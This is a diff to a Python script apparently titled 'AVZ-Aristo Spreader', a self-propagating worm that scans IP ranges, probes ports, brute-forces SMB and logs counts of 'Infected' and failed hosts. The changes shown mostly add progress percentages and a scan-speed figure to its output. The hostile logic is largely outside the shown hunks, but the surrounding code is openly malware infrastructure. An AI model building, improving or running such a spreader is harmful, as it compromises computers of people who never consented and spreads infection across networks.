@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.2 – ускоренный, UTC+5, потоковый вывод
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
 from datetime import datetime, timezone, timedelta
 
@@ -115,7 +114,7 @@ async def probe_port(ip, port):
     except:
         return False
 
-# ===== Векторы =====
+# ===== Векторы (с улучшенным логированием) =====
 async def smb_brute(ip):
     if sys.platform != 'linux':
         return False
@@ -492,6 +491,7 @@ async def scan_cycle(ips, progress_callback=None):
     port_stats = {}
     count = len(ips)
     progress_count = 0
+    start_time = time.time()
 
     async def progress_inner():
         nonlocal progress_count
@@ -499,7 +499,10 @@ async def scan_cycle(ips, progress_callback=None):
         if progress_count % 500 == 0 and progress_callback:
             await progress_callback(progress_count, count, stats, port_stats)
         elif progress_count % 100 == 0:
-            print(f"[{now_str()}] [DEBUG] Обработано {progress_count}/{count} IP...", flush=True)
+            percent = progress_count / count * 100
+            elapsed = time.time() - start_time
+            speed = progress_count / elapsed if elapsed > 0 else 0
+            print(f"[{now_str()}] [PROGRESS] {progress_count}/{count} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | Speed: {speed:.0f} IP/s", flush=True)
 
     for ip in ips:
         q.put_nowait(ip)
@@ -542,10 +545,11 @@ async def main_async(args):
 
     async def gui_progress(current, total, stats, port_stats):
         port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
+        percent = current / total * 100
         if port_str:
-            print(f"[{now_str()}] [PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
         else:
-            print(f"[{now_str()}] [PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
 
     if args.local:
         print(f"[{now_str()}] [*] Mode: local network", flush=True)
